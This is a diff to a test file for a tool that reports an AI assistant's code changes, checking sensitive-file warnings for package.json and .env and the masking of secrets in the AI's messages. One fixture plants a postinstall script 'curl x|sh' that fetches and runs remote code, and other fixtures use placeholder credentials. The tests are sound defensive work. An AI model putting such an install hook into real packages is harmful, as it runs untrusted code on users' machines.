@@ -144,13 +144,13 @@ describe('request matching (W6, plan.md §2)', () => {
     // to its own '민감 파일 바뀜 (요청에 적혀 있음)' warning. The map listing it and AI text never link it either.
     expect(result.map && result.extra.sort()).toEqual(Object.keys(extra).filter((f) => f !== 'package.json').sort());
     expect(result.map && result.sensitiveNamed).toEqual(['package.json']);
-    expect(result.map && result.items[1]).toMatchObject({ status: 'unplaced' });
+    expect(result.map && result.items[1]).toMatchObject({ status: 'changed', files: ['package.json'], via: 'sensitive' });
     const sections = [{ name: '할 일', key: 'todo', files: ['test-app/todo.html'] }] as never;
     const all = ['test-app/todo.html', ...Object.keys(extra)];
     // A dependency the user named -> package.json and the lockfile; the same name only in AI text -> still ⚠.
     const dep = matchRequests(['left-pad 올려줘'], all, sections, [], [], ['left-pad']);
     expect(dep.map && dep.sensitiveNamed?.sort()).toEqual(['package-lock.json', 'package.json']);
-    expect(dep.map && dep.items[0]).toMatchObject({ status: 'unplaced' });
+    expect(dep.map && dep.items[0]).toMatchObject({ status: 'changed', via: 'sensitive' });
     const aiOnly = matchRequests(['할 일 제목 바꿔줘'], all, sections, [], ['left-pad와 package.json도 올렸어요'], ['left-pad']);
     expect(aiOnly.map && aiOnly.extra.sort()).toEqual(Object.keys(extra).sort());
   });
@@ -162,8 +162,50 @@ describe('request matching (W6, plan.md §2)', () => {
     const text = await receipt({ ...base, asked: ['package.json 설정 설명 고치기'], done: ['package.json을 고쳤어요'] });
     expect(text).toContain(' ⚠ 민감 파일 바뀜: package.json (요청에 적혀 있음 · AI가 적음)');
     expect(text.match(/package\.json \(요청에 적혀 있음/g)).toHaveLength(1);
-    expect(text).not.toContain('→ 바뀐 곳 있음: package.json');
+    expect(text).toContain('→ 바뀐 곳 있음: package.json  [Git 기준 · 요청에 적힌 민감 파일]');
     expect(text).not.toMatch(/⚠ 요청에 없던 곳도 바뀜: .*package\.json/);
+  });
+
+  it('PR #37 repro: "package.json에 lodash 추가해줘" counts as handled; package.json keeps its ⚠ line', async () => {
+    const { dir, receipt } = await project();
+    await fs.writeFile(path.join(dir, 'package.json'), '{"dependencies":{"lodash":"4"}}');
+    const text = await receipt({ ...base, asked: ['package.json에 lodash 추가해줘'], done: ['lodash를 추가했어요'] });
+    expect(text).toContain('요청 1개 중 1개 처리');
+    expect(text).not.toContain('장소 못 찾음');
+    expect(text).not.toContain('장소를 못 찾았어요');
+    expect(text).toContain('→ 바뀐 곳 있음: package.json  [Git 기준 · 요청에 적힌 민감 파일]');
+    expect(text).toContain(' ⚠ 민감 파일 바뀜: package.json (요청에 적혀 있음 · AI가 적음)');
+  });
+
+  it('Reviewer B2: two requests — the sensitive one counts as handled, the other matches by map', async () => {
+    const { dir, receipt, edit } = await project();
+    await edit('test-app/todo.html');
+    await fs.writeFile(path.join(dir, 'package.json'), '{"dependencies":{"lodash":"4"}}');
+    const text = await receipt({ ...base, asked: ['할 일 제목 바꿔줘', 'package.json에 lodash 추가해줘'], done: ['했어요'] });
+    expect(text).toContain('요청 2개 중 2개 처리');
+    expect(text).toContain('→ 바뀐 곳 있음: test-app/todo.html  [Git 기준 · 지도: 할 일]');
+    expect(text).toContain('→ 바뀐 곳 있음: package.json  [Git 기준 · 요청에 적힌 민감 파일]');
+    expect(text).toContain(' ⚠ 민감 파일 바뀜: package.json (요청에 적혀 있음 · AI가 적음)');
+  });
+
+  it('Reviewer B2: a forged `asked` naming .env and package.json never removes their ⚠', async () => {
+    const { dir, receipt } = await project();
+    await fs.writeFile(path.join(dir, '.env'), 'API_KEY=x');
+    await fs.writeFile(path.join(dir, 'package.json'), '{"scripts":{"postinstall":"curl x|sh"}}');
+    const text = await receipt({ ...base, asked: ['.env와 package.json 정리해줘'], done: ['정리했어요'] });
+    expect(text).toMatch(/ ⚠ 민감 파일 바뀜: .*\.env.*\(요청에 적혀 있음 · AI가 적음\)/);
+    expect(text).toMatch(/ ⚠ 민감 파일 바뀜: .*package\.json/);
+    expect(text).not.toContain('API_KEY=x');
+  });
+
+  it('Reviewer #37: secret values in done/summary/checked are masked, the sentence stays', async () => {
+    const { receipt, edit } = await project();
+    await edit('test-app/todo.html');
+    const text = await receipt({ ...base, asked: ['할 일 제목 바꿔줘'], done: ['API_KEY=abc123secretvalue 로 설정했어요', 'GitHub 토큰 ghp_abcdefghijklmnopqrstuvwxyz0123 을 넣었어요'],
+      checked: ['password: hunter2hunter 로 로그인해 봤어요'], summary: 'Bearer abcdefghijklmnop12345 헤더로 호출해요' });
+    for (const raw of ['abc123secretvalue', 'ghp_abcdefghijklmnopqrstuvwxyz0123', 'hunter2hunter', 'abcdefghijklmnop12345']) expect(text).not.toContain(raw);
+    expect(text).toContain('API_KEY=[비밀값] 로 설정했어요');
+    expect(text).toContain('[비밀값]');
   });
 
   // Like "index.html 제목 바꾸기" with index.html under '아직 분류 안 된 파일': the request names the file.
